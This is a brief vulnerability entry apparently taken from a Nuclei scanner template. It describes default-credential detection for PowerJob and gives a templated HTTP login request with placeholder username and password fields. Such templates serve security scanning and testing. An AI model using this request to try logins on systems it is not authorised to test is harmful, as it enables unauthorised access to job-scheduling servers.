# Vulnerability: PowerJob - Default Login
**Classification:** POWERJOB
**Source:** Nuclei Template (`powerjob-default-login.yaml`)

## Description
PowerJob default login credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /appInfo/assert HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"appName":{{username}},"password":{{password}}}
```

